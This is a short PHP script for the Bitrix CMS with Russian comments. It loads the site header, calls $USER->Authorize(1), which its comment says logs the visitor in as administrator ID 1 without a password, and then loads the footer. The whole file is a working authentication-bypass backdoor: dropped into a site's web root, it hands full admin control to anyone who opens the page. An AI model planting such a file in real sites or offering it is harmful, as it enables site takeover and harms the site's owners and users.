<?php
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php"); // подключение шапки сайта и подклчения всех классов и заимствований ядра Битрикс
global $USER; // Глобальный метод работы с пользователями
$USER->Authorize(1); //авторизует под админом (ID=1) без ввода пароля
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php"); //подключает подвал сайта